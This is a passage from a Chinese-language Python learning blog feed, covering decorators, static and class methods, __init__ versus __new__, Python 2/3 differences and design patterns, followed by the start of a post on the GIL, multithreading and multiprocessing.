class="hljs-keyword">def</span> <span class="hljs-title function_">decorator_get_function_name</span>(<span class="hljs-params">func</span>):<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">获取正在运行函数名</span><br><span class="hljs-string">:return:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*arg</span>):<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">wrapper</span><br><span class="hljs-string">:param arg:</span><br><span class="hljs-string">:return:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前运行方法名：<span class="hljs-subst">&#123;func.__name__&#125;</span>  with  params: <span class="hljs-subst">&#123;arg&#125;</span>&quot;</span>)<br><span class="hljs-keyword">return</span> func(*arg)<br><br><span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@decorator_get_function_name </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_func_add</span>(<span class="hljs-params">x, y</span>):<br><span class="hljs-built_in">print</span>(x + y)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_func_sub</span>(<span class="hljs-params">x, y</span>):<br><span class="hljs-built_in">print</span>(x - y)<br><br><br>test_func_add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># 当前运行方法名：test_func_add  with  params: (1, 2)</span><br><span class="hljs-comment"># 3</span><br><span class="hljs-comment"># 不使用语法糖的话也可以用以下方法，效果是一样的</span><br>decorator_get_function_name(test_func_sub)(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><span class="hljs-comment"># 我们还可以换种写法达到跟👆一样的效果，就是使用引用</span><br>dec_obj = decorator_get_function_name(test_func_sub)  <span class="hljs-comment"># 这里等同于wrapper对象</span><br>dec_obj(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>)  <span class="hljs-comment"># 这里等同于wrapper(3,5)</span><br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># 当前运行方法名：test_func_sub  with  params: (3, 5)</span><br><span class="hljs-comment"># -2</span><br></code></pre></td></tr></table></figure><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>常用于鉴权、日志记录、缓存等</p><p>下面举一个鉴权的实际例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_check</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">request, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.session.get(<span class="hljs-string">&#x27;login_status&#x27;</span>):<br>            <span class="hljs-keyword">return</span> HttpResponseRedirect(<span class="hljs-string">&#x27;/api/login/&#x27;</span>)<br>        <span class="hljs-keyword">return</span> func(request, *args, **kwargs)<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@login_check</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_config</span>(<span class="hljs-params">request, *args, **kwargs</span>):<br>    <span class="hljs-comment"># do some edit func</span><br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>当我们执行edit_config时，首先将edit_config作为参数传入login_check，然而login_check返回了wrapper函数对象，我们进入wrapper可以看到，会检查登录状态，如果未登录直接重定向到登录页面，否则执行func(request, *args, **kwargs)，而此时我们知道func就是传入的edit_config，因此最终如果登录成功就会执行edit_config(request, *args, **kwargs)。</p><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>@staticmethod </p><p>静态方法是类中的函数，不需要实例。静态方法主要是用来存放逻辑性的代码，主要是一些逻辑属于类，但是和类本身没有交互，即在静态方法中，不会涉及到类中的方法和属性的操作。可以理解为将静态方法存在此类的名称空间中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeTest</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,hour,minute,second</span>):<br>        self.hour = hour<br>        self.minute = minute<br>        self.second = second<br><span class="hljs-meta">    @staticmethod   </span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">showTime</span>():      <br>        <span class="hljs-keyword">return</span> time.strftime(<span class="hljs-string">&quot;%H:%M:%S&quot;</span>, time.localtime())<br> <br>     <br><span class="hljs-built_in">print</span>(TimeTest.showTime())<br>t = TimeTest(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>)<br>nowTime = t.showTime()<br><span class="hljs-built_in">print</span>(nowTime)<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">16</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03</span><br><span class="hljs-attribute">16</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03</span><br></code></pre></td></tr></table></figure><p>静态函数可以通过类名以及实例两种方法调用。</p><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><p>@classmethod</p><p>类方法是当调用这个方法时，将类作为第一个参数传递，而不是该类的实例(就像我们通常对方法所做的那样)。这意味着您可以在该方法中使用类及其属性，而不是在特定实例中使用。</p><p>类方法可以通过实例对象和类对象进行调用，在编码过程中发现类方法调用在实例对象初始化之前，故如果实现功能时需要在初始化前做一些校验的工作时可以考虑使用类方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">testFunction</span>():<br><br>    classAttribute =<span class="hljs-string">&#x27;monica&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,example_name</span>):<br>        self.example_name = example_name<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testStatic</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;静态方法使用&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;调用类属性&#x27;</span>,testFunction.classAttribute)<br>        <span class="hljs-comment">#print(&#x27;调用实例属性&#x27;,self.example_name)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testExample</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;实例方法&#x27;</span>)<br>        <span class="hljs-comment">#print(&#x27;调用实例属性:&#x27;,self.example_name)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;调用类属性:&#x27;</span>,testFunction.classAttribute)<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">testClassMethod</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;类方法&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;调用类属性：&#x27;</span>,cls.classAttribute)<br>        <span class="hljs-comment">#print(&#x27;调用实例属性:&#x27;,cls.example_name)</span><br><br>tf = testFunction(<span class="hljs-string">&#x27;example_monica&#x27;</span>)<br><span class="hljs-comment">#实例对象调用静态方法</span><br>tf.testStatic()<br><span class="hljs-comment">#类对象调用静态方法</span><br>testFunction.testStatic()<br><span class="hljs-comment">#实例对象调用方法</span><br>tf.testExample()<br><span class="hljs-comment">#类对象调用实例方法</span><br>testFunction.testExample(<span class="hljs-string">&#x27;test&#x27;</span>)<br><span class="hljs-comment">#实例对象调用类方法</span><br>tf.testClassMethod()<br><span class="hljs-comment">#类对象调用类方法</span><br>testFunction.testClassMethod()<br></code></pre></td></tr></table></figure><p>上面的例子表明，类方法是不能调用实例属性的。</p><h2 id="其他python问题"><a href="#其他python问题" class="headerlink" title="其他python问题"></a>其他python问题</h2><h3 id="python如何完成异常处理"><a href="#python如何完成异常处理" class="headerlink" title="python如何完成异常处理"></a>python如何完成异常处理</h3><p><a href="https://www.runoob.com/python/python-exceptions.html">Python 异常处理 | 菜鸟教程 (runoob.com)</a></p><h3 id="Python-init-与-new-的区别"><a href="#Python-init-与-new-的区别" class="headerlink" title="Python __init__  与 __new__的区别"></a>Python __init__  与 __new__的区别</h3><h4 id="同"><a href="#同" class="headerlink" title="同"></a>同</h4><p>二者均是Python面向对象语言中的函数，__new__比较少用，__init__则用的比较多。</p><h4 id="异"><a href="#异" class="headerlink" title="异"></a>异</h4><p>__new__是在实例创建之前被调用的，因为它的任务就是创建实例然后返回该实例对象，是个静态方法。<br>__init__是当实例对象创建完成后被调用的，然后设置对象属性的一些初始值，通常用在初始化一个类实例的时候。是一个实例方法。<br>也就是： __new__先被调用，__init__后被调用，__new__的返回值（实例）将传递给__init__方法的第一个参数，然后__init__给这个实例设置一些参数。</p><h3 id="Python2与Python3的区别"><a href="#Python2与Python3的区别" class="headerlink" title="Python2与Python3的区别"></a>Python2与Python3的区别</h3><h4 id="1-print-从语句变为函数："><a href="#1-print-从语句变为函数：" class="headerlink" title="1.print 从语句变为函数："></a>1.print 从语句变为函数：</h4><p> 原:   print  1, 2+3</p><p>改为: print ( 1, 2+3 )</p><h4 id="2-range-与-xrange"><a href="#2-range-与-xrange" class="headerlink" title="2.range 与 xrange"></a>2.range 与 xrange</h4><p>原 : range( 0, 4 )   结果 是 列表 [0,1,2,3 ]</p><p>改为：list( range(0,4) )</p><p>原 : xrange( 0, 4 )    适用于 for 循环的变量控制</p><p>改为：range(0,4)</p><h4 id="3-try-except-语句的变化"><a href="#3-try-except-语句的变化" class="headerlink" title="3.try except 语句的变化"></a>3.try except 语句的变化</h4><p>原:</p><pre><code class="hljs"> try:    ...... except    Exception, e :    ......</code></pre><p>改为</p><pre><code class="hljs">try:    ......except    Exception as e :    ......</code></pre><h4 id="4-除法运算符"><a href="#4-除法运算符" class="headerlink" title="4.除法运算符"></a>4.除法运算符</h4><p>python 2.4.2以前</p><p>   10&#x2F;3      结果为 3     </p><p>python 3.0</p><p>   10 &#x2F; 3 结果为 3.3333333333333335</p><p>   10 &#x2F;&#x2F; 3 结果为 3</p><h4 id="5-lib缓存"><a href="#5-lib缓存" class="headerlink" title="5.lib缓存"></a>5.lib缓存</h4><p>在导入模块运行时  python2  只会在模块同级目录下生成.pyc文件  python3  生成__pycache__目录</p><h4 id="6-默认编码"><a href="#6-默认编码" class="headerlink" title="6.默认编码"></a>6.默认编码</h4><p>python2的编码是ascii码，python3的默认编码是utf-8</p><h4 id="7-输入"><a href="#7-输入" class="headerlink" title="7.输入"></a>7.输入</h4><p>python3中input得到的数据都是str型</p><p>python2中input默认是int型，str要使用引号包裹，raw_input得到的都是str</p><h3 id="python-xxx-xxx和-xxx-的区别"><a href="#python-xxx-xxx和-xxx-的区别" class="headerlink" title="python _xxx __xxx和__xxx__的区别"></a>python _xxx __xxx和__xxx__的区别</h3><ol><li>单前导下划线 _xxx：内部私有变量,protected</li><li>单末尾下划线 xxx_：避免与python关键字产生命名冲突，比如想用class名称作为变量，可以用class_</li><li>双前导下划线__xxx: “__spam”这种形式（至少两个前导下划线，最多一个后续下划线）的任何标识符将会被“_classname__spam”这种形式原文取代，private</li><li>双前导和双末尾下划线 __xxx__：一种约定,Python内部的名字,用来区别其他用户自定义的命名,以防冲突，就是例__init__(), __del__(),__call__()这些特殊方法</li></ol><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>确保某一个类只有一个实例存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(Singleton, <span class="hljs-string">&quot;_instance&quot;</span>): <span class="hljs-comment"># 反射</span><br>            Singleton._instance = <span class="hljs-built_in">object</span>.__new__(cls)<br>        <span class="hljs-keyword">return</span> Singleton._instance<br><br>obj1 = Singleton()<br>obj2 = Singleton()<br><span class="hljs-built_in">print</span>(obj1, obj2) <span class="hljs-comment"># &lt;__main__.Singleton object at 0x000002511B67B448&gt; &lt;__main__.Singleton object at 0x000002511B67B448&gt;</span><br></code></pre></td></tr></table></figure><h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><p>创建一个特定类型的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-literal">None</span><br>        self.gender = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getGender</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.gender<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Male</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello Mr.&quot;</span> + name)<br>        self.name = name<br>        self.gender = <span class="hljs-string">&#x27;M&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Female</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello Miss.&quot;</span> + name)<br>        self.name = name<br>        self.gender = <span class="hljs-string">&#x27;F&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Factory</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getPerson</span>(<span class="hljs-params">self, name, gender</span>):<br>        <span class="hljs-keyword">if</span> gender == <span class="hljs-string">&#x27;M&#x27;</span>:<br>                <span class="hljs-keyword">return</span> Male(name)<br>        <span class="hljs-keyword">if</span> gender == <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-keyword">return</span> Female(name)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    factory = Factory()<br>    person = factory.getPerson(<span class="hljs-string">&quot;Chetan&quot;</span>, <span class="hljs-string">&quot;M&quot;</span>)<br>    <span class="hljs-built_in">print</span>(person.name, person.gender)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python多线程的深入学习</title>
    <link href="/blog/2022/10/31/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2022/10/31/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>做一个漏洞扫描器的时候偶然听到学长们聊Python的多线程是伪多线程，但是自己第一次知道，之前没有深入去了解过Python多线程具体的底层是什么样子的，遂学习记录一下，一直学习就好了。</strong></p><p><img src="/images/fj38.jpg"></p><span id="more"></span><h2 id="Python中的并发任务"><a href="#Python中的并发任务" class="headerlink" title="Python中的并发任务"></a>Python中的并发任务</h2><h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><p>操作系统书本上的定义：并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。 </p><p>在多道程序环境下，并发性是指在一段时间内宏观上有多个程序在同时运行，但在单处理机系统中，每一时刻却仅能有一道程序执行，故微观上这些程序只能是分时地交替执行。</p><p>Python中并发任务实现方式包含：多线程threading和协程asyncio，它们的共同点都是交替执行，而区别是多线程threading是抢占式的，而协程asyncio是协作式的。</p><h3 id="什么是线程"><a href="#什么是线程" class="headerlink" title="什么是线程"></a>什么是线程</h3><p>线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个进程可以有很多线程，每条线程并行执行不同的任务。</p><p>多线程执行任务实例：</p><p><img src="/images/python-thread.png" alt="thread"></p><h3 id="什么是协程"><a href="#什么是协程" class="headerlink" title="什么是协程"></a>什么是协程</h3><p>协程运行在线程之上，当一个协程执行完成后，可以选择主动让出，让另一个协程运行在当前线程之上。<strong>协程并没有增加线程数量，只是在线程的基础之上通过分时复用的方式运行多个协程</strong>，而且协程的切换在用户态完成，切换的代价比线程从用户态到内核态的代价小很多。协程和异步IO一起使用才会发挥最好效果。</p><p><img src="/images/coroutine.jpg" alt="coroutine"></p><h2 id="为什么说Python是伪多线程"><a href="#为什么说Python是伪多线程" class="headerlink" title="为什么说Python是伪多线程"></a>为什么说Python是伪多线程</h2><h3 id="全局解释器锁（GIL）"><a href="#全局解释器锁（GIL）" class="headerlink" title="全局解释器锁（GIL）"></a>全局解释器锁（GIL）</h3><p>GIL的全称是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在<strong>cpython</strong>中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。</p><h3 id="Python多线程下线程执行方式"><a href="#Python多线程下线程执行方式" class="headerlink" title="Python多线程下线程执行方式"></a>Python多线程下线程执行方式</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">获取GIL<br><br>执行代码直到<span class="hljs-keyword">sleep</span>或者是<span class="hljs-keyword">python</span>虚拟机将其挂起<br><br>释放GIL<br></code></pre></td></tr></table></figure><p>在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。</p><p>在Python3.2之前，GIL的释放逻辑是当前线程遇见IO操作或者ticks计数达到100 （ticks可以看作是Python自身的一个计数器，专门作用于GIL，每次释放后归零，这个计数可以通过 sys.setcheckinterval 来调整），进行释放。之后版本已经不是通过指令条数来切换了，而是时间间隔，采用sys.setswitchinterval。</p><p>而每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)，这就是为什么在多核CPU上，python的多线程效率并不高。</p><p>这里需要注意一下：GIL只会对CPU密集型的程序产生较大的负面影响（主要完成计算任务的程序）</p><h3 id="如何打破GIL锁的限制"><a href="#如何打破GIL锁的限制" class="headerlink" title="如何打破GIL锁的限制"></a>如何打破GIL锁的限制</h3><ol><li>如果完全使用Python来编程，可以使用<code>multiprocessing</code>模块来创建进程池，多进程就可以避免GIL的限制</li><li>第二种方式是把重点放在C语言的扩展编程上。主要思想就是将计算密集的任务转移到C语言中，使其独立于Python，在C代码中释放GIL。</li><li>使用非官方解释器，比如JPython</li></ol><h2 id="Python-多线程、协程、多进程的使用"><a href="#Python-多线程、协程、多进程的使用" class="headerlink" title="Python 多线程、协程、多进程的使用"></a>Python 多线程、协程、多进程的使用</h2><h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><p>多进程适用于CPU运算密集型任务</p><h4 id="使用multiprocessing"><a href="#使用multiprocessing" class="headerlink" title="使用multiprocessing"></a>使用multiprocessing</h4><p>通过对Process类实例化之后获得一个进程p之后，通过p.start()就可以启动该进程了。<strong>p.join()方法就是让主进程进入阻塞状态，等对应的子进程执行完毕再执行下一行，主要用于进程同步</strong>。</p><p>这里采用Queue的方法进行进程间的通信，创建了一个接收进程和一个发送进程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os, time, random<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">q</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;子进程：接收进程（<span class="hljs-subst">&#123;os.getpid()&#125;</span>）开始！&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 用产生随机数的方法模拟数据的接收</span><br>        data = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;子进程：接收进程接收到数据<span class="hljs-subst">&#123;data&#125;</span>！&#x27;</span>)<br>        q.put(data)<br>        sleep_time = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)<br>        time.sleep(sleep_time/<span class="hljs-number">10</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">q</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;子进程：转发进程（<span class="hljs-subst">&#123;os.getpid()&#125;</span>）开始！&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 注意：如果q里面没有数据，get()方法就会等待，直到获得一个数据并赋值给data</span><br>        data = q.get()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;子进程：转发进程接收到数据<span class="hljs-subst">&#123;data&#125;</span>并开始处理、转发！&#x27;</span>)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;主进程（<span class="hljs-subst">&#123;os.getpid()&#125;</span>）开始...&#x27;</span>)<br>    q = Queue()<br>    p1 = Process(target=recv, args=(q,))<br>    p2 = Process(target=send, args=(q,))<br>    p1.start()<br>    p2.start()<br>    p1.join()<br>    p2.join()<br></code></pre></td></tr></table></figure><p>注：参考的实例代码来自<a href="https://zhuanlan.zhihu.com/p/493699150">Python多进程详解 - 知乎 (zhihu.com)</a></p><h4 id="concurrent-futures-ProcessPoolExecutor"><a href="#concurrent-futures-ProcessPoolExecutor" class="headerlink" title="concurrent.futures.ProcessPoolExecutor()"></a>concurrent.futures.ProcessPoolExecutor()</h4><p>concurrent.futures 是 3.2 中引入的新模块，它为异步执行可调用对象提供了高层接口。可以使用 ThreadPoolExecutor 来进行多线程编程，ProcessPoolExecutor 进行多进程编程，两者实现了同样的接口，这些接口由抽象类 Executor 定义。这个模块提供了两大类型，一个是执行器类 Executor，另一个是 Future 类。执行器用来管理工作池，future 用来管理工作计算出来的结果，通常不用直接操作 future 对象，因为有丰富的 API。</p><p>一个判断是否为素数的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent <span class="hljs-keyword">import</span> futures<br><span class="hljs-keyword">import</span> math<br><br>PRIMES = [<br>    <span class="hljs-number">112272535095293</span>,<br>    <span class="hljs-number">112582705942171</span>,<br>    <span class="hljs-number">112272535095293</span>,<br>    <span class="hljs-number">115280095190773</span>,<br>    <span class="hljs-number">115797848077099</span>,<br>    <span class="hljs-number">1099726899285419</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    sqrt_n = <span class="hljs-built_in">int</span>(math.floor(math.sqrt(n)))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, sqrt_n + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">if</span> n % i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> futures.ProcessPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-keyword">for</span> number, prime <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(PRIMES, executor.<span class="hljs-built_in">map</span>(is_prime, PRIMES)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%d is prime: %s&#x27;</span> % (number, prime))<br><br><span class="hljs-keyword">if</span> __name__ == <span 